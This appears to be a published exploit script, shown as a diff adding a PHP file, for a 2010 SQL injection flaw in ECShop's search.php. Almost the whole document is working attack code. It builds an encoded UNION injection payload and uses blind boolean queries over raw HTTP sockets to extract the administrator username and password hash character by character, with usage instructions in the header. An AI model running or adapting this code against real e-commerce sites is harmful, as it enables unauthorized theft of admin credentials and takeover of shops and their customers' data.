@@ -1,0 +1,160 @@
+# Exploit Title: ECShop Search.php SQL Injection Exploit
+# Date: 2010-05-17
+# Author: Jannock
+# Software Link: http://www.ecshop.com
+# Version: ECShop All Version
+# Tested on:
+# CVE :
+# WAVDB: WAVDB-01606
+# Code :
+
+&lt;?php
+ini_set(&quot;max_execution_time&quot;,0);
+error_reporting(7);
+
+function usage()
+{
+global $argv;
+exit(
+&quot;\n--+++============================================================+++--&quot;.
+&quot;\n--+++====== ECShop Search.php SQL Injection Exploit========+++--&quot;.
+&quot;\n--+++============================================================+++--&quot;.
+&quot;\n\n[+] Author: jannock&quot;.
+&quot;\n[+] Team: [url]http://wavdb.com/[/url]&quot;.
+&quot;\n[+] Usage: php &quot;.$argv[0].&quot; &lt;hostname&gt; &lt;path&gt; &lt;goods_id&gt;&quot;.
+&quot;\n[+] Ex.: php &quot;.$argv[0].&quot; localhost / 1&quot;.
+&quot;\n\n&quot;);
+}
+
+function query($pos, $chr, $chs,$goodid)
+{
+switch ($chs){
+case 0:
+$query = &quot;1=1&quot;;
+break;
+case 1:
+$query = &quot; ascii(substring((select user_name from ecs_admin_user limit
+0,1),{$pos},1))={$chr}&quot;;
+break;
+case 2:
+$query = &quot; ascii(substring((select password from ecs_admin_user limit
+0,1),{$pos},1))={$chr}&quot;;
+break;
+case 3:
+$query = &quot; length((select user_name from ecs_admin_user limit 0,1))={$pos}&quot;;
+break;
+}
+$list=array(&quot;1&#039; or 1=1) and 1=2 GROUP BY goods_id HAVING num = &#039;1&#039;
+union select $goodid,1 from ecs_admin_user where 1=1 and &quot;. $query
+.&quot;/*&quot;=&gt;&quot;1&quot;);
+$query = array(&quot;attr&quot;=&gt;$list);
+$query = str_replace(&#039;+&#039;, &#039;%2b&#039;, base64_encode(serialize($query)));
+return $query;
+}
+
+function exploit($hostname, $path, $pos, $chr, $chs,$goodid)
+{
+$chr = ord($chr);
+$conn = fsockopen($hostname, 80);
+
+$message = &quot;GET &quot;.$path.&quot;/search.php?encode=&quot;.query($pos, $chr,
+$chs,$goodid).&quot; HTTP/1.1\r\n&quot;;
+$message .= &quot;Host: $hostname\r\n&quot;;
+$message .= &quot;Connection: Close\r\n\r\n&quot;;
+
+fwrite($conn, $message);
+while (!feof($conn))
+{
+$reply .= fgets($conn, 1024);
+}
+fclose($conn);
+return $reply;
+}
+
+
+function crkusername($hostname, $path, $chs,$goodid)
+{
+global $length;
+$key = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;;
+$chr = 0;
+$pos = 1;
+echo &quot;[+] username: &quot;;
+while ($pos &lt;= $length)
+{
+$response = exploit($hostname, $path, $pos, $key[$chr], $chs,$goodid);
+
+if (preg_match (&quot;/javascript:addToCart/i&quot;, $response))
+{
+echo $key[$chr];
+$chr = 0;
+$pos++;
+}
+else
+$chr++;
+}
+echo &quot;\n&quot;;
+}
+
+function crkpassword($hostname, $path, $chs,$goodid)
+{
+$key = &quot;abcdef0123456789&quot;;
+$chr = 0;
+$pos = 1;
+echo &quot;[+] password: &quot;;
+while ($pos &lt;= 32)
+{
+$response = exploit($hostname, $path, $pos, $key[$chr], $chs,$goodid);
+if (preg_match (&quot;/javascript:addToCart/i&quot;, $response))
+{
+echo $key[$chr];
+$chr = 0;
+$pos++;
+}
+else
+$chr++;
+}
+echo &quot;\n\n&quot;;
+}
+
+function lengthcolumns($hostname, $path,$chs, $goodid)
+{
+echo &quot;[+] username length: &quot;;
+$exit = 0;
+$length = 0;
+$pos = 1;
+$chr = 0;
+while ($exit==0)
+{
+$response = exploit($hostname, $path, $pos, $chr, $chs,$goodid);
+if (preg_match (&quot;/javascript:addToCart/i&quot;, $response))
+{
+$exit = 1;
+$length = $pos;
+break;
+}
+else
+{
+$pos++;
+if($pos&gt;20)
+{
+exit(&quot;Exploit failed&quot;);
+}
+}
+}
+echo $length.&quot;\n&quot;;
+return $length;
+}
+
+
+if ($argc != 4)
+usage();
+$hostname = $argv[1];
+$path = $argv[2];
+$goodid = $argv[3];
+$length = lengthcolumns($hostname, $path, 3, $goodid);
+crkusername($hostname, $path, 1,$goodid);
+crkpassword($hostname, $path, 2,$goodid);
+
+?&gt;
+
+
